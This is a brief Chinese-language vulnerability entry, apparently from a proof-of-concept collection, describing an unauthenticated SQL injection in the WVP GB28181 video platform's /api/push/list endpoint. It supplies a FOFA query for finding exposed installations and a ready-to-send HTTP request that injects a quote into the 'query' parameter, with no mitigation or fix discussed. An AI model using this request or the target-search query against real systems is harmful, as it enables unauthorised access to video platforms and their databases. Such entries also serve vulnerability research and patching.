# WVP视频平台(国标28181)未授权SQL注入漏洞

WVP视频平台(国标28181)未授权接口/api/push/list存在SQL注入漏洞

## fofa

```yaml
body="国标28181"
```

## poc

```
GET /api/push/list?page=1&count=15&query=1'&pushing=&mediaServerId= HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
```

![image-20240723184213670](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407231842730.png)